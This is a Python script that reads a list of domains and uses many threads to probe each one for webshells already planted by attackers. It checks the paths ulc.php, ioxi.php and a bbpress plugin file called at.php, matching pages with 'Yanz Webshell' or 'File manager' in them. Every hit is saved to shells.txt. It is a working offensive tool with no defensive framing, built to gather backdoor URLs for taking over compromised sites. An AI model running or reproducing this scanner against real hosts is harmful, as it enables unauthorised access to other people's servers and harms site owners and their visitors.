import re
import requests
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor, as_completed
import concurrent.futures
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Headers for requests
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'Referer': 'www.google.com'
}

# Colors for output
fr = Fore.RED
fg = Fore.GREEN

def URLdomain(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    pattern = re.compile('(.*)/')
    while re.findall(pattern, site):
        site = re.findall(pattern, site)[0]
    return site

def ulc(url):
    try:    
        url_http = 'http://' + URLdomain(url) + '/ulc.php'
        check = requests.get(url_http, headers=headers, allow_redirects=True, timeout=15)
        if 'Yanz Webshell' in check.content.decode("utf-8"):
            print(f' [#] ULC SHELL FOUND --> {url_http} {fg}[Successfully]')
            open('shells.txt', 'a').write(url_http + '\n')
        else:
            url_https = 'https://' + URLdomain(url) + '/ulc.php'
            check = requests.get(url_https, headers=headers, allow_redirects=True, verify=False, timeout=15)
            if 'Yanz Webshell' in check.content.decode("utf-8"):
                print(f' [#] ULC SHELL FOUND --> {url_https} {fg}[Successfully]')
                open('shells.txt', 'a').write(url_https + '\n')
            else:
                check = requests.get(url_http, headers=headers, allow_redirects=True, timeout=15)
                if 'File manager' in check.content.decode("utf-8"):
                    print(f' [#] ULC SHELL FOUND --> {url_http} {fg}[Successfully]')
                    open('shells.txt', 'a').write(url_http + '\n')
                else:
                    check = requests.get(url_https, headers=headers, allow_redirects=True, verify=False, timeout=15)
                    if 'File manager' in check.content.decode("utf-8"):
                        print(f' [#] ULC SHELL FOUND --> {url_https} {fg}[Successfully]')
                        open('shells.txt', 'a').write(url_https + '\n')
    except requests.RequestException:
        pass

def ioxi(url):
    try:    
        url_http = 'http://' + URLdomain(url) + '/ioxi.php'
        check = requests.get(url_http, headers=headers, allow_redirects=True, timeout=15)
        if 'Yanz Webshell' in check.content.decode("utf-8"):
            print(f' [#] IOXI SHELL FOUND --> {url_http} {fg}[Successfully]')
            open('shells.txt', 'a').write(url_http + '\n')
        else:
            url_https = 'https://' + URLdomain(url) + '/ioxi.php'
            check = requests.get(url_https, headers=headers, allow_redirects=True, verify=False, timeout=15)
            if 'Yanz Webshell' in check.content.decode("utf-8"):
                print(f' [#] IOXI SHELL FOUND --> {url_https} {fg}[Successfully]')
                open('shells.txt', 'a').write(url_https + '\n')
            else:
                check = requests.get(url_http, headers=headers, allow_redirects=True, timeout=15)
                if 'File manager' in check.content.decode("utf-8"):
                    print(f' [#] IOXI SHELL FOUND --> {url_http} {fg}[Successfully]')
                    open('shells.txt', 'a').write(url_http + '\n')
                else:
                    check = requests.get(url_https, headers=headers, allow_redirects=True, verify=False, timeout=15)
                    if 'File manager' in check.content.decode("utf-8"):
                        print(f' [#] IOXI SHELL FOUND --> {url_https} {fg}[Successfully]')
                        open('shells.txt', 'a').write(url_https + '\n')
    except requests.RequestException:
        pass

def at(url):
    try:    
        url_http = 'http://' + URLdomain(url) + '/wp-content/plugins/bbpress/at.php'
        check = requests.get(url_http, headers=headers, allow_redirects=True, timeout=15)
        if 'File Manager' in check.content.decode("utf-8"):
            print(f' [#] AT SHELL FOUND --> {url_http} {fg}[Successfully]')
            open('shells.txt', 'a').write(url_http + '\n')
        else:
            url_https = 'https://' + URLdomain(url) + '/wp-content/plugins/bbpress/at.php'
            check = requests.get(url_https, headers=headers, allow_redirects=True, verify=False, timeout=15)
            if 'File Manager' in check.content.decode("utf-8"):
                print(f' [#] AT SHELL FOUND --> {url_https} {fg}[Successfully]')
                open('shells.txt', 'a').write(url_https + '\n')
    except requests.RequestException:
        pass

def process_domain(domain):
    ulc(domain)
    ioxi(domain)
    at(domain)

def main():
    file_name = input("Enter the file name containing the domains: ")
    try:
        with open(file_name, 'r') as f:
            domains = [line.strip() for line in f]

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(process_domain, domain) for domain in domains]
            concurrent.futures.wait(futures)

    except FileNotFoundError:
        print(f'{fr}File not found. Please check the file name and try again.')

if __name__ == "__main__":
    main()
